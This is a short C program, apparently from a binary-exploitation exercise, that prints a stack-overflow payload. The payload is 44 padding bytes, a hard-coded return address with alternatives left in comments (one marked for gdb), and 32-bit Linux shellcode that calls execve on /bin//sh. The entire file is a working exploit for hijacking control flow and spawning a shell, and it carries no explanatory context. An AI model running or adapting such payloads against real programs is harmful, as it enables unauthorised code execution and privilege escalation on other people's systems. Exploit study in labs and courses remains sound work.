#include <stdio.h>
#include <string.h>

char shellcode[] =
    "\x31\xc0"		//xorl %eax,%eax
    "\x50"     		//pushl %eax
    "\x68""//sh"	//pushl $0x68732f2f
    "\x68""/bin"	//pushl $0x6e69622f
    "\x89\xe3" 		//movl %esp,%ebx
    "\x50"     		//pushl %eax
    "\x53"     		//pushl %ebx
    "\x89\xe1" 		//movl %esp,%ecx
    "\x99"     		//cdq
    "\xb0\x0b" 		//movb $0x0b,%al
    "\xcd\x80" 		//int $0x80
;

int main() {
	for (int i = 0; i < 44; i++) printf("A");
	//printf("\x10\xc4\xff\xff"); //in gdb
	printf("\x0c\xc5\xff\xff");
	//printf("\x40\xd2\xff\xff\xff\x7f");
	printf("%s", shellcode);
	return 0;
}
